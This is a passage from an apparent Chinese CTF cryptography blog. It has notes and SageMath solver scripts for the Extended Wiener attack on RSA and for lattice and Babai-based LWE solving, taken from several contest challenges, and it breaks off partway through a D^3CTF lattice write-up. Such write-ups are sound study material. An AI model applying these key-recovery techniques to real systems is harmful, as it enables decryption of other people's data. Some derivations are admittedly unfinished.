\\\\0&amp;M_1e_1&amp;-M_2e_1&amp;-e_1N \\\\0&amp;0&amp;M_2e_2&amp;-e_2N \\\\0&amp;0&amp;0&amp;e_1e_2\\end{pmatrix}$$这里$M_1 = N^{1 \\over 2},M_2 = N^{1+\\alpha_2},\\alpha_2 = {5 \\over 14 } - \\epsilon’$LLL()规约出基$b =(b_1,b_2,b_3,b_4)$后求phi即可 exp123456789101112131415161718192021222324252627282930from Crypto.Util.number import long_to_bytese1 = 28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581e2 = 131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563N = 159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253c1 = 89410578059910615243542114610890994179298819076294899300341196922537672226283347286177838507350481980653301675042566354947161446918391494634173771489921535378415952543761341962187827617956463740415683816828323475428328607025791449389552492799278886876413138326117622825124519567340298133646090783889193450681c2 = 106022564245731443282859231814772725680579944691962958987527668508496192529331599682371642691880849071915084510118117099828154554231286326729922119326305261125960484865171940233343041874124811917291652357776045940511178855947892557181650249473057939642726565131933445072147505756108121271288834439942107732015for epsilon in range(100): M1 = int(N^(0.5)) M2 = int(N^(1+5/14 - (epsilon*0.01))) #epsilon是没办法确定的, 小小的爆破一下 v1 = vector([N,-M1*N,0,N^2]) v2 = vector([0,M1*e1,-M2*e1,-e1*N]) v3 = vector([0,0,M2*e2,-e2*N]) v4 = vector([0,0,0,e1*e2]) L = Matrix([v1,v2,v3,v4]) B = L.LLL()[0] B = L.solve_left(B) phi = floor(e1 * B[1]//B[0]) # 这边phi会前后差1或者差2 for j in range(-2,3): try: d1 = inverse_mod(e1,phi+j) d2 = inverse_mod(e2,phi+j) flag = long_to_bytes(pow(c1,d1,N)) + long_to_bytes(pow(c2,d2,N)) if b&#x27;&#123;&#x27; in flag and b&#x27;&#125;&#x27; in flag: print(i,flag) except: pass 后记看完了理论自己代码实现的时候还是会有不少问题的.. 这里有一个Matrix.solve_left和Matrix.solve_right的区别, 也没怎么搞懂, 主要是不知道这两个到底什么时候用什么, 只能先每次都试试这两个了.","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"Extending Wiener Attack","slug":"Extending-Wiener-Attack","permalink":"http://tearsjin.github.io/tags/Extending-Wiener-Attack/"},{"name":"Lattice","slug":"Lattice","permalink":"http://tearsjin.github.io/tags/Lattice/"}]},{"title":"Reading notes Extending Wiener's Attack in the Presence of Many Decrypting Exponents","date":"2021-03-12T04:54:13.000Z","path":"2021/03/12/Reading-notes-Extending-Wiener-s-Attack-in-the-Presence-of-Many-Decrypting-Exponents/","text":"introductionthe purpose of this paper is given only several public exponents for a given modulus and the know-ledge of the corresponding private being quiet small. Low Private Exponent Attacks on RSAWiener’s ApproachThe Wiener’s Attack in this paper not the same as I had learnt before.$$e \\cdot d - k \\lambda(N) = 1 \\$$ Let $ \\lambda(N) = {(p-1)(q-1) \\over g} , s = 1 - p - q$ then we have$$e \\cdot d - {k(p-1)(q-1) \\over g} \\= e \\cdot d - {k(N+s) \\over g} = 1 \\$$ $$egd - kN = g + ks \\tag{1}$$ Dividing both side of equation (1) by $dgN$$${e \\over N} - {k \\over dg} = {g + ks \\over dgN} = ({k \\over dg})({s\\over N})+{1 \\over dN}$$Because $e \\approx N$ and $s \\approx N^{1 \\over 2}$, we have ${k \\over dg} \\approx 1$, hence $({k \\over dg})({s\\over N})+{1 \\over dN} \\approx N^{-{1 \\over 2}}$ Then we need to quote an important conclusion: if$$|x - {a \\over b }| &lt; {1 \\over 2b^2}$$then ${a\\over b} $ is a continued fraction approximant of $ x$ so if$$N^{-{1 \\over 2}}&lt;{1 \\over 2(dg)^2}\\$$then ${k \\over dg}$ will be a continued fraction approximant of $ {e \\over N}$ Condition can convert to gm$$d &lt; {2^{-{1\\over 2}}N^{1\\over4} \\over g} \\tag{2}$$and g will be small under the assumption that $\\lambda(N) \\approx N$(but $g \\ge 2 $ since p,q is odd)when we get $dg$ , we can factor N so that break the RSA cryptosystem. Guo’s ApproachThis approach assumes that one has more than one $e_i$ for a given N, and each of these $e_i$ has a relatively small $d_i$. For 2 encryption exponents, we have following relations:$$e_1d_1g - k_1(p-1)(q-1) = g \\e_2d_2g - k_2(p-1)(q-1) = g$$Multiplying the first by $k_2$ and the second by $k_1$, and Subtraction of two formulas gives$$k_2d_1e_1 - k_1d_2e_2 = k_2 - k_1 \\tag{3}$$Dividing both sides of equation 3 by $k_2d_1e_2$$${e_1 \\over e_2} - {k_1d_2 \\over k_2d_1} = {k_2 - k_1 \\over k_2d_1e_2}$$and assuming that the $d_i$ are at most $N^{\\alpha}$ , so the right-hand side is about $N^{-(1 + \\alpha)}$if we want the fraction $k_1d_2 \\over k_2d_1$ could be a continued fraction approximant of $e_1 \\over e_2$, we must have$$2(k_2d_1)^2 &lt; N^{1 + \\alpha}$$and with the assumption that $k_2$ and $d_1$ are at most $N^{\\alpha}$ and the g is small this condition will be true where $\\alpha = {1 \\over 3} - \\epsilon $ with $\\epsilon &gt; 0$ But known the $k_2d_1$ and $k_1d_2$ can not break the RSA cryptosystem for two reason.The solution is omitted here …. Overview of our Extension ApproachThis approach also assumes that we have more than one $e_i$ and each of these $e_i$ has a relatively small $d_i$ and the bounds of $d_i \\ (i = 1,2,\\cdots,n)$ is: The $d$ can as large as $N^{\\alpha} $ where$${(2n+1)2^n - (2n+1) { n \\choose n/2 }\\over(2n-2)2^n + (4n+2) { n \\choose n/2 }} \\quad if\\ n\\ is\\ even \\\\ {(2n+1)2^n - 4n {n-1\\choose (n-1)/2 } \\over (2n-2)2^n + 8n {n-1\\choose (n-1)/2}}\\quad if\\ n\\ is\\ odd,$$For some reason , the attack is only practical for small $n$(the number of $e$, not the modulus $N$). An Extension in the Presence of Many Small Decryption ExponentsPreliminariesLet us refer to the relations of the form$$W_i = d_ige_i - k_iN =g+ k_is \\G_{i,j} = k_id_je_j - k_jd_ie_i = k_i - k_j$$we shall also assume, for a given $n$, that the $d_i$ and $k_i$ are at most $N^{\\alpha_{n}}$, the $g$ is very small, the $s$ is about $N^{1 \\over 2}$ RSA in the presence of 2 Small Decryption ExponentsIf we have two small decryption exponents,then the following relations hold:$W_1, G_{1,2},W_1W_2,$ or more explicitly: (这部分英文没看懂, 把原句抄下来了)$$d_1ge_1 - k_1N =g +k_1s, \\\\k_1d_2e_2 - k_2d_1e_1 = k_1 - k_2,\\\\d_1d_2g^{2}e_1e_2 - d_1gk_2e_1N - d_2gk_1e_2N + k_1k_2N^2 = (g + k_1s)(g+ k_2s)$$Multiplying the first by $k_2$ , we may write these equations in the matrix form below.$$(k_1k_2,d_1gk_2,d_2gk_1,d_1d_2g^2)\\begin{pmatrix}1&amp;-N&amp;0&amp;N^2 \\\\ 0&amp;e_1&amp;-e_1&amp;-e_1N \\\\ 0&amp;0&amp;e_2&amp;-e_2N \\\\ 0&amp;0&amp;0&amp;e_1e_2\\end{pmatrix} \\\\ =(k_1k_2,k_2(g+k_1s),k_1-k_2,(g+k_1s)(g+k_2s))$$The sizes of the entries of the vectors on the right-hand side are at most $N^{2\\alpha_2} , N^{2\\alpha_2 + {1 \\over 2}}, N^{\\alpha_2},N^{1+2\\alpha_2} $respectively Multiplying the first three columns of the matrix by $N,M_1=N^{1\\over2},M_2=N^{1+\\alpha_2}$ respectively, which gives following matrix:$$L_2=\\begin{pmatrix}N&amp;-M_1N&amp;0&amp;N^2\\\\0&amp;M_1e_1&amp;-M_2e_1&amp;-e_1N\\\\0&amp;0&amp;M_2e_2&amp;-e_2N\\\\0&amp;0&amp;0&amp;e_1e_2\\end{pmatrix}$$In this case the vector $b=(k_1k_2,d_1gk_2,d_2gk_1,d_1d_2g^2)$ will be such that$$||bL_2|| &lt; 2N^{1+2\\alpha_2}.$$if the Lattice $L_2$ is pretty “random” , there are almost no lattice points of $L_2$ shorter than the Minkowski bounds $2\\Delta^{1\\over 4}$. Under this assumptions, then $bL_2$ is the shortest point in $L_2$, if$$2N^{1+2\\alpha_2}&lt;({1\\over{c_2}})(N^{ {13\\over2}+\\alpha_2})^{1\\over4}$$ for some small $c_2$, which is true if$$\\alpha_2&lt;{5\\over 14}-\\epsilon$$ So, if$\\alpha_2&lt;{5\\over14}-\\epsilon$, the vector $b = (b_1,b_2,b_3,b_4)$ can be found via Lattice basis reduction algorithms(e.g. LLL), so that we can calculate ${d_1g \\over k_1} = {b2 \\over b1}$. Then we can factor N via wiener’s approach. RSA in the presence of 3 Small Decryption ExponentsJust like the last section(RSA in the presence of 2 Small Decryption Exponents), the Lattice is:$$L_3 =\\begin{pmatrix}1&amp;-N&amp;0&amp;-N^2&amp;0&amp;0&amp;0&amp;-N^3\\\\0&amp;e_1&amp;-e_1&amp;-e_1N&amp;-e_1&amp;0&amp;e_1N&amp;e_1N^{2}\\\\0&amp;0&amp;e_2&amp;-e_2N&amp;0&amp;e_2N&amp;0&amp;e_2N^2\\\\0&amp;0&amp;0&amp;e_1e_2&amp;0&amp;-e_1e_2&amp;-e_1e_2&amp;-e_1e_2N\\\\0&amp;0&amp;0&amp;0&amp;e_3&amp;-e_3N&amp;-e_3N&amp;e_3N^2\\\\0&amp;0&amp;0&amp;0&amp;0&amp;e_1e_3&amp;0&amp;-e_1e_3N\\\\0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;e_2e_3&amp;e_2e_3N\\\\0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;e_1e_2e_3\\\\\\end{pmatrix}\\cdot D$$where $D$ is:$$diag(N^{3 \\over2},N,N^{({3\\over 2})+\\alpha_3},N^{1\\over2},N^{({3\\over2})+\\alpha_3},N^{1+\\alpha_3},N^{1+\\alpha_3},1)$$ RSA in the presence of 4 Small Decryption ExponentsThe matrix is too big…..","tags":[{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"Reading","slug":"Reading","permalink":"http://tearsjin.github.io/tags/Reading/"}]},{"title":"The learning of LWE","date":"2021-03-11T10:56:47.000Z","path":"2021/03/11/The-learning-of-LWE/","text":"做Ant&amp;d3的时候发现自己Lattice还不会, 所以就去学了一波Lattice, 顺便就了解了一下LWE, 发现这玩意居然有三次比赛用的都是同一个板子, 也每个都去做了分析了一下, 然后就集中在这里了. X-NUCA Diamond题目1234567891011121314151617181920212223242526272829303132#!/usr/bin/env sageimport osfrom hashlib import sha256from Crypto.Cipher import AESfrom sage.crypto.lwe import LWEfrom sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler as DGDISfrom secret import FLAGassert FLAG.startswith(b&quot;X-NUCA&#123;&quot;) and FLAG.endswith(b&quot;&#125;&quot;)A = random_matrix(ZZ, 320, 5, x = 10, y = 1000)B = Matrix(A * vector([randint(1, 2^1024) for _ in range(5)]) for _ in range(7))L = LWE(n = 25, q = 1000, D = DGDIS(3))S = [L() for _ in range(64)]M = Matrix(64, 25, [int(i).__xor__(int(j)) for i,j in zip(A.list(), (Matrix([x for x, _ in S])).list())])T = Matrix([randint(1, 2^1024) for _ in range(64)])R = T.transpose().stack(T * vector([y for _, y in S]).change_ring(ZZ))if __name__ == &quot;__main__&quot;: key = sha256(&#x27;&#x27;.join(list(map(str, L._LWE__s))).encode()).digest() iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv) ct = cipher.encrypt(FLAG) f = open(&quot;output.txt&quot;, &quot;wb&quot;) f.write(str(B.list()).encode() + b&#x27;\\n&#x27;) f.write(str(M.list()).encode() + b&#x27;\\n&#x27;) f.write(str(R.list()).encode() + b&#x27;\\n&#x27;) f.write((iv + ct).hex().encode()) f.close() 一些新见到的函数 random_matrix(ZZ, 5, 320, x = 10, y = 1000): 随机生成一个整数的$320 \\cdot 5$矩阵, 其元素的取值范围是$[x,y)$也就是$[10,1000)$ LWE(n = 25, q = 1000, D = DGDIS(3)): 生成一个25维 $mod \\ 1000$的LWE对象 D - an error distribution such as an instance of DiscreteGaussianDistributionIntegerSampler stack(): 在末尾添加一行 题目中给出的一些条件 首先是一个320*5的矩阵$A$，乘上了一个随机变换矩阵5*7的矩阵$R$，得到了一个320*7的矩阵B 然后是一个LWE，生成了64组数据，$s⋅A_{lwe}+e=a$，没有直接给我们$A_{lwe}$和$a$。只给了$M=A{lwe}\\bigoplus A$，以及用$s$作为AES的key，对flag进行了加密。 再就是一个knapsack problem，用长度为64的向量$a$与一个另外一个很大的长度为64的随机向量$T$相乘，得到一个很大的数$sum$。给了$T$以及$sum$。 knapsack problem这里有一个背包问题$$a_0T_0+a_1T_1+…+a_{63}T_{63} = sum$$其中已知$T_0,T_1,…,T_{63},sum$,而且$T_i$非常大, $a_i \\le 1000$ , 可以由上述式子构造格子$$A=\\begin{pmatrix}1&amp;0&amp;\\cdots&amp;0&amp;T_0\\\\0&amp;1&amp;\\cdots&amp;0&amp;T_1\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;0&amp;\\vdots\\\\0&amp;0&amp;\\cdots&amp;1&amp;T_{63}\\\\0&amp;0&amp;\\cdots&amp;0&amp;-sum\\end{pmatrix}$$则有$$\\begin{pmatrix}a_0,a_1,…,a_{63},{1}\\end{pmatrix}\\begin{pmatrix}1&amp;0&amp;\\cdots&amp;0&amp;T_0\\\\0&amp;1&amp;\\cdots&amp;0&amp;T_1\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;0&amp;\\vdots\\\\0&amp;0&amp;\\cdots&amp;1&amp;T_{63}\\\\0&amp;0&amp;\\cdots&amp;0&amp;-sum\\end{pmatrix}=\\begin{pmatrix}a_0,a_1,…,a_{63},{0}\\end{pmatrix}$$可以看到$\\begin{pmatrix}a_0,a_1,…,a_{63},0\\end{pmatrix}$是其中一个格点, 而且非常的小, 可以尝试用LLL将其规约出来 123456789101112R = [...]Lattice = [[0 for _ in range(65)] for _ in range(65)]for i in range(65): for j in range(65): if i==j and i!= 64: Lattice[i][j] = 1 if j== 64: Lattice[i][j] = R[i]Lattice[64][64] = -Lattice[64][64]Lattice = Matrix(Lattice)a = Lattice.LLL()[0][:-1]# (868, 798, 863, 260, 206, 550, 326, 908, 49, 50, 273, 528, 584, 569, 975, 261, 885, 680, 116, 33, 677, 664, 922, 178, 999, 336, 60, 655, 102, 438, 269, 754, 988, 124, 10, 380, 589, 382, 668, 623, 335, 845, 104, 117, 961, 917, 114, 590, 255, 26, 81, 846, 925, 548, 446, 796, 543, 997, 492, 651, 485, 137, 701, 247) 恢复$A_{lwe}$这部分还有些不明白,先放着 LWE$$s \\cdot A + e = a$$ 可以将这个等式理解成$A$是一个格子, $s$是一个线性组合, 那么$b = s \\cdot A$是一个格点, $e$是误差, $a = b+e$是一个非格点. LWE就是要找到这么离这个非格点最近的格点. 也就是CVP了 当$s$的长度不是很长的时候, 也就是说维度比较小的时候, 这个CVP还是可以解决的, 而这里$s$的长度是25, 观察一下LWE的式子.$$s_0A_{i,0}+s_1A_{i,1}+…+s_{24}A_{i,24} + e_i = a_i \\ (mod \\ p)$$熟悉的造格子前的套路, 将式子化为:$$s_0A_{i,0}+s_1A_{i,1}+…+s_{24}A_{i,24} + k_ip + e_i= a_i$$那么可以构造出等式:$$s \\cdot L + e =(s_0,s_1,…,s_{24},k_0,k_1,…,k_{39})\\begin{pmatrix}A_{0,0}&amp;A_{1,0}&amp;\\cdots&amp;A_{39,0}\\\\A_{0,1}&amp;A_{1,1}&amp;\\cdots&amp;A_{39,1}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\A_{0,24}&amp;A_{1,24}&amp;\\cdots&amp;A_{39,24}\\\\p&amp;0&amp;\\cdots&amp;0\\\\0&amp;p&amp;\\cdots&amp;0\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\0&amp;0&amp;\\cdots&amp;p\\\\\\end{pmatrix}+(e_0,e_1,…,e_{39})=(c_0,c_1,…,c_{39})$$先对矩阵$L$进行规约, 得到一个good basis, 再用Babai’s algorithm求解CVP，即可得到离$a$最近的格点$b$。 最后解方程$A_{lwe} \\cdot s = b^{T} (mod \\ 1000)$ 解出$s$这道题基本上就做完了 下面是Babai’s algorithm的板子 12345678910111213141516171819def BabaisClosestPlaneAlgorithm(L, w): &#x27;&#x27;&#x27; Yet another method to solve apprCVP, using a given good basis. INPUT: * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice. * &quot;w&quot; -- a target vector to approach to. OUTPUT: * &quot;v&quot; -- a approximate closest vector. Quoted from &quot;An Introduction to Mathematical Cryptography&quot;: In both theory and practice, Babai&#x27;s closest plane algorithm seems to yield better results than Babai&#x27;s closest vertex algorithm. &#x27;&#x27;&#x27; G, _ = L.gram_schmidt() t = w i = L.nrows() - 1 while i &gt;= 0: w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i] i -= 1 return t - w 总的exp就没写了, 具体的可以参照着下面两题来写, 反正都是一个板子的 2020祥云杯 Easy MatrixProblem1234567891011121314151617181920import numpy as npfrom secret import *def random_offset(size): x = np.random.normal(0, 4.7873, size) return np.rint(x)secret = np.array(list(flag))column = len(list(secret))row = 128prime = 2129matrix = np.random.randint(512, size=(row, column))product = matrix.dot(secret) % primeoffset = random_offset(size=row).astype(np.int64)result = (product + offset) % primenp.save(&quot;matrix.npy&quot;, matrix)np.save(&quot;result.npy&quot;, result) 条件读取了matrix后就可以知道column = 42 将flag转成一个1*42的矩阵$secret$ 来看看过程, 先是生成一个42*128 的随机矩阵$matrix$, 元素都$\\leq 512$ 然后计算$product = matrix \\cdot secret \\ (mod \\ prime)$, 结果应该是一个$1*128$的矩阵 继续生成一个1*128随机矩阵$offset$ 最后计算$result = (product + offset) \\ (mod \\ prime)$ 题目给了$result$和$matrix$ 分析来看一下加密的式子$$R = S \\cdot M + e \\ (mod \\ p)$$显然是一个LWE, 现在已知的是$M$和$R$, 要求$S$, 将式子写具体$$R = (r_0,r_1,..,r_{127}) =(s_0,s_1,…,s_{41})\\begin{pmatrix}m_{0,0}&amp;m_{1,0}&amp;\\cdots&amp;m_{127,0}\\\\m_{0,1}&amp;m_{1,1}&amp;\\cdots&amp;m_{127,1}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\m_{0,41}&amp;m_{1,42}&amp;\\cdots&amp;m_{127,41}\\end{pmatrix}+(e_0,e_1,…,e_{41})(mod \\ p)$$也就是说$$r_i = s_0m_{i,0} + s_1m_{i,1}+…+s_{41}m_{i,41} + e_i (mod \\ p)$$ 老套路, 改写成等式有$$s_0m_{i,0} + s_1m_{i,1}+…+s_{41}m_{i,41} + e_i + k_ip = r_i \\s \\cdot A + e = r$$ 解决LWE可以构造格子, 然后用LLL和babai’s nearest plane来解决, 下面就根据等式构造格子$$A=\\begin{pmatrix}m_{0,0}&amp;m_{1,0}&amp;\\cdots&amp;m_{127,0}\\\\m_{0,1}&amp;m_{1,1}&amp;\\cdots&amp;m_{127,1}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\m_{0,41}&amp;m_{1,42}&amp;\\cdots&amp;m_{127,41}\\\\p&amp;0&amp;\\cdots&amp;0\\\\0&amp;p&amp;\\cdots&amp;0\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\0&amp;0&amp;\\cdots&amp;p\\end{pmatrix}\\begin{pmatrix}p&amp;0&amp;\\cdots&amp;0\\\\0&amp;p&amp;\\cdots&amp;0\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\0&amp;0&amp;\\cdots&amp;p\\\\m_{0,0}&amp;m_{1,0}&amp;\\cdots&amp;m_{127,0}\\\\m_{0,1}&amp;m_{1,1}&amp;\\cdots&amp;m_{127,1}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\m_{0,41}&amp;m_{1,42}&amp;\\cdots&amp;m_{127,41}\\\\\\end{pmatrix}\\\\$$ 实际上做的时候右边的格子才有用, 左边的不行, 具体原因我也搞不清楚, 问了老师也没问出什么结果 然后就可以用LLL格约出good basis 再用babai’s nearest plane解CVP了 解出CVP也就意味着找到了$s \\cdot A = b$中的$b$ , $A$又是已知的, 解方程即可 exp123456789101112131415161718192021222324252627282930313233343536373839404142import numpy as npfrom sage.modules.free_module_integer import IntegerLatticedef BabaisClosestPlaneAlgorithm(L, w): &#x27;&#x27;&#x27; Yet another method to solve apprCVP, using a given good basis. INPUT: * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice. * &quot;w&quot; -- a target vector to approach to. OUTPUT: * &quot;v&quot; -- a approximate closest vector. Quoted from &quot;An Introduction to Mathematical Cryptography&quot;: In both theory and practice, Babai&#x27;s closest plane algorithm seems to yield better results than Babai&#x27;s closest vertex algorithm. &#x27;&#x27;&#x27; G, _ = L.gram_schmidt() t = w i = L.nrows() - 1 while i &gt;= 0: w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i] i -= 1 return t - wrow = 128col = 42p = 2129M = Matrix(list(np.load(&#x27;matrix.npy&#x27;)))R = vector(list(np.load(&#x27;result.npy&#x27;)))A = [[0 for _ in range(row)] for _ in range(row)]for i in range(128): for j in range(128): if i==j: A[i][j] = pA = Matrix(A)L = Matrix(A.stack(M.transpose()))lattice = IntegerLattice(L, lll_reduce=True)closest_vector = BabaisClosestPlaneAlgorithm(lattice.reduced_basis, R)FLAG = Matrix(Zmod(p), M)flag = FLAG.solve_right(closest_vector)print(&#x27;&#x27;.join( chr(i) for i in flag)) 2020纵横杯 babyLWEproblem1234567891011121314151617181920212223from sage.crypto.lwe import LWEfrom sage.stats.distributions.discrete_gaussian_integer \\ import DiscreteGaussianDistributionIntegerSampler as DGDISimport uuidFLAG = &#x27;flag&#123;&#x27; + str(uuid.uuid4()) + &#x27;&#125;&#x27;FLAG = FLAG.encode().replace(b&#x27;-&#x27;,b&#x27;&#x27;)assert FLAG.startswith(b&#x27;flag&#123;&#x27;) and FLAG.endswith(b&#x27;&#125;&#x27;)s = list(FLAG[5:-1])n = len(s)q = random_prime(1&lt;&lt;512, proof=False, lbound=1&lt;&lt;511)lwe = LWE(n=n, q=q, D=DGDIS(1&lt;&lt;128))lwe._LWE__s = vector(Zmod(q), s)L = [lwe() for _ in range(2*n)]with open(&#x27;task.txt&#x27;, &#x27;w&#x27;) as f: _ = f.write(f&quot;q = &#123;q&#125;\\n&quot;) _ = f.write(f&quot;L = &#123;L&#125;\\n&quot;) 分析太离谱了, 一个板子三个比赛用, 这题用的还是X-NUCA Diamond的LWE的板子…但是为了充分理解(就是还没理解)LWE到底是怎么通过格子解出来的 先看看这题造的格子加密的式子还是$s \\cdot M + e = a \\ (mod \\ q)$, 这里的$s,M$长度32,一共64个式子这里只知道$M$和$a$要求$s$, 思路都是记$s \\cdot M = b $, $b$是格子$M$的一个格点, $a$是格外一个点, 通过对$M$规约找到$good \\ basis$ 再利用最近平面算法解决一个CVP, 也就是找到离$a$最近的向量, 也就是$b$ 把$s \\cdot M = b \\ (mod \\ q)$再详细点就是$$s_0M_{i,0}+s_1M_{i,1}+…+s_{31}M_{i,31} = b_i + k_iq\\\\s_0M_{i,0}+s_1M_{i,1}+…+s_{31}M_{i,31}+ k_iq = b_i$$那么造出来的格子应该是下面这个矩阵$$(s_0,s_1,\\cdots,s_{31},k_0,k_1,\\cdots,k_{63})\\begin{pmatrix}M_{0,0}&amp;M_{1,0}&amp;\\cdots&amp;M_{63,0}\\\\M_{0,1}&amp;M_{1,1}&amp;\\cdots&amp;M_{63,1}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\M_{0,31}&amp;M_{1,31}&amp;\\cdots&amp;M_{63,31}\\\\q&amp;0&amp;\\cdots&amp;0\\\\0&amp;q&amp;\\cdots&amp;0\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\0&amp;0&amp;0&amp;q\\end{pmatrix}=(b_0,b_1,\\cdots,b_{63})$$ 实际上做题的时候矩阵是上面$p$下面$M$的, 然后还有关于为什么要用64组LWE的问题, 根据某个大佬的博客, 组数越多越好, 所以基本上题目给了多少组就用上多少组 通过对构造出来的格子进行规约得到good basis然后用最近平面算出$(b_0,b_1,…,b_{63})$再解方程$s \\cdot M = b \\ (mod \\ p)$即可得到$s$ exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from sage.modules.free_module_integer import IntegerLatticedef BabaisClosestPlaneAlgorithm(L, w): &#x27;&#x27;&#x27; Yet another method to solve apprCVP, using a given good basis. INPUT: * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice. * &quot;w&quot; -- a target vector to approach to. OUTPUT: * &quot;v&quot; -- a approximate closest vector. Quoted from &quot;An Introduction to Mathematical Cryptography&quot;: In both theory and practice, Babai&#x27;s closest plane algorithm seems to yield better results than Babai&#x27;s closest vertex algorithm. &#x27;&#x27;&#x27; G, _ = L.gram_schmidt() t = w i = L.nrows() - 1 while i &gt;= 0: w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i] i -= 1 return t - wq = 8934325385505568130914092337950620590424921674062792756625169144539462888362199042365894202712873706261308891694743761726859424971637596576879385466842113L = [...]n = 32Q = [[0 for _ in range(2*n)] for _ in range(2*n)]R = [0 for _ in range(2*n)]LL = [[0 for _ in range(n)] for _ in range(2*n)]for i in range(2*n): for j in range(n): LL[i][j] = L[i][0][j] M = Matrix(LL).transpose()for i in range(2*n): for j in range(2*n): if i == j: Q[i][j] = qfor i in range(2*n): R[i] = L[i][1]R = vector(R)L = Matrix(Q).stack(Matrix(M))lattice = IntegerLattice(L, lll_reduce=True)closest_vector = BabaisClosestPlaneAlgorithm(lattice.reduced_basis, R)FLAG = Matrix(Zmod(q), M.transpose())flag = FLAG.solve_right(closest_vector)print(&#x27;&#x27;.join( chr(i) for i in flag))","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"LWE","slug":"LWE","permalink":"http://tearsjin.github.io/tags/LWE/"}]},{"title":"writeup for 2021AntCTFxD^3CTF Crypto","date":"2021-03-08T11:08:34.000Z","path":"2021/03/08/write-for-2021AntCTFxD-3CTF/","text":"啊这次的这个比赛因为不会Lattice, 导致基本不会做啊, 虽然比赛后半段去学了也试着做了, 虽然格子造出来还被自己蠢到了, 但还是…收获很多hh 记录一下吧 babylattice当时做题的时候完全没有看到明文就是一个数字, 并不能转换成有语义的字符串….导致格子都造出来了还一直卡着但也体会到了一些造格子的方法, 以及格约出向量后需要注意的地方 problem12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from collections import namedtuplePublicKey = namedtuple(&#x27;PublicKey&#x27;, [&#x27;n&#x27;, &#x27;b&#x27;])SecretKey = namedtuple(&#x27;SecretKey&#x27;, [&#x27;p&#x27;, &#x27;q&#x27;, &#x27;A&#x27;])def gen_key(): p = random_prime(2^512, lbound=2^511) q = random_prime(2^512, lbound=2^511) n = p * q a11, a12, a21 = [random_prime(2^100) for _ in range(3)] a22 = random_prime(2^100) while a11 * a22 == a12 * a21: a22 = random_prime(2^100) A = Matrix(ZZ, [[a11, a12], [a21, a22]]) a1 = crt([a11, a21], [p, q]) a2 = crt([a12, a22], [p, q]) b = a1 * inverse_mod(a2, n) % n PK = PublicKey(n, b) SK = SecretKey(p, q, A) return (PK, SK)def encrypt(m, pk): assert 0 &lt; m &lt; 2^400 r = randint(0, 2^400-1) c = (pk.b*m + r) % pk.n return cdef decrypt(c, sk): a2 = crt([sk.A[0,1], sk.A[1,1]], [sk.p, sk.q]) s1 = a2 * c % sk.p s2 = a2 * c % sk.q m, r = sk.A.solve_right(vector([s1, s2])) return mdef test(pk, sk, num=3): for _ in range(num): m = randint(0, 2^400-1) c = encrypt(m, pk) mm = decrypt(c, sk) assert m == mmif __name__ == &#x27;__main__&#x27;: from hashlib import sha256 from secret import m, FLAG assert FLAG == &#x27;d3ctf&#123;%s&#125;&#x27; % sha256(int(m).to_bytes(50, &#x27;big&#x27;)).hexdigest() PK, SK = gen_key() test(PK, SK) c = encrypt(m, PK) print(f&quot;PK = &#123;PK&#125;&quot;) print(f&quot;c = &#123;c&#125;&quot;)&quot;&quot;&quot;PK = PublicKey(n=69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361, b=65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196)c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570&quot;&quot;&quot; 出现的参数 $m$: 明文, $m \\in (0,2^{400})$ $c = m \\cdot b + r \\ (mod\\ n)$ : 密文, 其中$r \\in (0,2^{400})$ $A = \\begin{pmatrix} a_{11}&amp;a_{21}\\\\a_{12}&amp;a_{22}\\end{pmatrix}$四个$a$都是100-Bit $p,q$: 512-Bit prime $a1 = crt([a11, a21], [p, q])\\ 